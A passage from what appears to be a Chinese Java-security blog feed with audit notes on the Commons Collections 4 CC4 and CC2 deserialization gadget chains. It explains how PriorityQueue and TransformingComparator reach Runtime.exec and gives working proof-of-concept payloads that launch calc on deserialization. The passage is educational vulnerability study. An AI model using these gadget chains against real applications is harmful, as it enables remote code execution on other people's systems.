com.lingx5;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] getEvilBytes() <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">evil</span> <span class="hljs-operator">=</span> ctClass.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        evil.setSuperclass(ctClass.get(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));<br>        evil.makeClassInitializer().insertBefore(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        <span class="hljs-keyword">return</span> evil.toBytecode();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>            f.setAccessible(<span class="hljs-literal">true</span>);<br>            f.set(obj, value);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] bytes = getEvilBytes();<br>            <span class="hljs-comment">// 构造 TemplatesImpl 对象</span><br>            <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>            setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;evil&quot;</span>);<br>            setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)<br>            &#125;;<br>            <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>            <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer,<span class="hljs-literal">null</span>);<br>            <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>, comparator);<br>            setFieldValue(priorityQueue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>            setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br>            <span class="hljs-comment">// 序列化</span><br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>            objectOutputStream.writeObject(priorityQueue);<br>            <span class="hljs-comment">// 反序列化</span><br>            <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>            objectInputStream.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406214206484.png" alt="image-20250406214206484"></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
      <category>Apache-CC链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>Apache-CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java-CC2 链审计笔记</title>
    <link href="/2025/04/06/java-CC2-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/04/06/java-CC2-%E9%93%BE%E5%AE%A1%E8%AE%A1%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h1 id="java-CC2-链审计笔记"><a href="#java-CC2-链审计笔记" class="headerlink" title="java-CC2 链审计笔记"></a>java-CC2 链审计笔记</h1><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Gadget chain:<br>ObjectInputStream.readObject()<br>PriorityQueue.readObject()<br>...<br>TransformingComparator.compare()<br>InvokerTransformer.transform()<br>Method.invoke()<br>Runtime.exec()<br></code></pre></td></tr></table></figure><blockquote><p>@Dependencies({ “org.apache.commons: commons-collections4:4.0” })</p></blockquote><h2 id="链条分析"><a href="#链条分析" class="headerlink" title="链条分析"></a>链条分析</h2><p>依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这条链是在 common-collections4 下的，因为在 3.x 的版本中 <code>TransformingComparator</code> 并没有去实现 <code>Serializable</code> 接口，也就是说它不可以被序列化</p><p>先来看链条尾部这部分</p><blockquote><p>InvokerTransformer.transform()<br>Method.invoke()<br>Runtime.exec()</p></blockquote><p>这个 InvokerTransformer.transform() 我们 CC1 审计的时候就知道了，他具有反射调用任意方法的能力</p><p>我们直接来看 <code>TransformingComparator.compare()</code> 这个方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406124329839.png" alt="image-20250406124329839"></p><p>看到这个方法确实在调用 <code>transform</code> 方法 , 我们只需要做到 transformer 参数可控即可</p><p>看到他的构造方法是 public 的，且做了初始化 transformer 的操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TransformingComparator</span><span class="hljs-params">(Transformer&lt;? <span class="hljs-built_in">super</span> I, ? extends O&gt; transformer, Comparator&lt;O&gt; decorated)</span> &#123;<br>        <span class="hljs-built_in">this</span>.decorated = decorated;<br>        <span class="hljs-built_in">this</span>.transformer = transformer;<br>    &#125;<br></code></pre></td></tr></table></figure><p>我们看谁在调用 compare 方法</p><p>这里链条作者找到了 java.util.PriorityQueue 中的方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406125827541.png" alt="image-20250406125827541"></p><p>我们分别来看一下</p><p>先来看 siftUpUsingComparator() ，发现它确实有在调用 compare 方法，自需要满足 k &gt; 0 即可</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406130832293.png" alt="image-20250406130832293"></p><p>我们去找哪里在调用 siftUpUsingComparator() 这个方法</p><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406130735132.png" alt="image-20250406130735132"></p><p>发现 siftup() 方法，但是遗憾的是这个方法最终走不到 readObject() 方法，只能作罢</p><p>我们接着来看 <code>siftDownUsingComparator()</code> 这个方法</p><p>跟着这个方法，可以发现他是可以被 readObject() 调用的，调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">java.util.PriorityQueue#readObject<br>java.util.PriorityQueue#heapify<br>java.util.PriorityQueue#siftDown  <span class="hljs-comment">// 满足 comparator != null </span><br>java.util.PriorityQueue#siftDownUsingComparator<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406133010217.png" alt="image-20250406133010217"></p><p>看到要执行 compare ，得满足 <code>k&lt;half</code> 我们可以看到 half 是 size 无符号 右移一位得到的，其实就是 <code>half = size/2</code></p><p>我们来跟踪一下 <code>k</code> 的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>        siftDown(i, (E) queue[i]);<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">siftDown</span><span class="hljs-params">(<span class="hljs-type">int</span> k, E x)</span> &#123;<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-literal">null</span>)<br>        siftDownUsingComparator(k, x);<br>    <span class="hljs-keyword">else</span><br>        siftDownComparable(k, x);<br>&#125;<br></code></pre></td></tr></table></figure><p>看到 k 的值 来自 heapify() 函数的循环中，值为 <code>(size &gt;&gt;&gt; 1) - 1</code> 也就是说 <code>size &gt;= 2</code> 才能满足 siftDownUsingComparator 中的 <code>k&lt;half</code>（(size &gt;&gt;&gt; 1) - 1 <code>&lt;</code> size &gt;&gt;&gt; 1）</p><p>那我们如何操作 size 的值呢？这里有两种方法 </p><ol><li>调用自身的方法操作</li><li>用反射赋值</li></ol><p>看到 offer 方法 ， 在给 size 做 + 1 的操作，我们调用两次 offer() 方法，size 的值就是 2 了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">offer</span><span class="hljs-params">(E e)</span> &#123;<br>    <span class="hljs-keyword">if</span> (e == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>    modCount++;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> size;<br>    <span class="hljs-keyword">if</span> (i &gt;= queue.length)<br>        grow(i + <span class="hljs-number">1</span>);<br>    size = i + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)<br>        queue[<span class="hljs-number">0</span>] = e;<br>    <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// 这个方法我们上面也分析过，它在  comparator != null 时，也会去执行恶意代码，我们用反射赋值</span><br>        siftUp(i, e);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>private final Comparator &lt;? super E&gt; comparator;</p><p>虽然为 final 修饰，但是他的值为 null 我们是可以利用反射来赋值的</p></blockquote><p>我们来做一个实验</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">S1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;lingx4&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">S1</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">S1</span>();<br>        System.out.println(s1.a);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> s1.getClass().getDeclaredField(<span class="hljs-string">&quot;a&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(s1,<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        System.out.println(s1.a);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406150206310.png" alt="image-20250406150206310"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">S1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">S1</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">S1</span>();<br>        System.out.println(s1.a);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> s1.getClass().getDeclaredField(<span class="hljs-string">&quot;a&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(s1,<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        System.out.println(s1.a);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406150235878.png" alt="image-20250406150235878"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="自身方法"><a href="#自身方法" class="headerlink" title="自身方法"></a>自身方法</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                                   <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                                   <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">// 让 size=2 </span><br>        priorityQueue.offer(<span class="hljs-number">1</span>);<br>        priorityQueue.offer(<span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 反射给 priorityQueue的comparator变量赋值</span><br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> priorityQueue.getClass().getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(priorityQueue,comparator);<br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;CC2.ser&quot;</span>);<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fileOutputStream);<br>            objectOutputStream.writeObject(priorityQueue);<br><br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;CC2.ser&quot;</span>);<br>            <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fileInputStream);<br>            objectInputStream.readObject();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250406144122639.png" alt="image-20250406144122639"></p><p><strong>注意：</strong></p><p>这里如果不用反射给 priorityQueue 的 comparator 变量赋值的话，我们在执行 <code> priorityQueue.offer(1)</code> 的时候，会来到如下方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>&#125;<br></code></pre></td></tr></table></figure><p>this.decorated.compare(value1, value2) 方法会抛出异常，程序就终止了，无法完成序列化和反序列化操作</p><h3 id="反射方式"><a href="#反射方式" class="headerlink" title="反射方式"></a>反射方式</h3><p><span style="color:#FF0000;"> 用反射赋值就不用担心这个问题 </span></p><p>用反射需要注意 size 和 queue ，都需要操作。 别让数组和长度溢出了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                                   <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<br>                                   <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>     